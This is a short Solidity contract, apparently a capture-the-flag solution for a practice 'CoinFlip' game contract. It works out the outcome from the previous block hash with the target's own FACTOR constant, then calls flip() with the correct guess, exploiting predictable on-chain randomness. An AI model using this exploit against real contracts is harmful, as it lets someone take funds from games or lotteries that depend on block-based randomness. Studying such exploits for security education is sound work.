// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip private coinFlipContract;
    uint256 private lastHash;
    uint256 private FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipAddr) {
        coinFlipContract = _coinFlipAddr;
    }

    function flipCheat() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            coinFlipContract.flip(true);
        } else {
            coinFlipContract.flip(false);
        }
    }
}
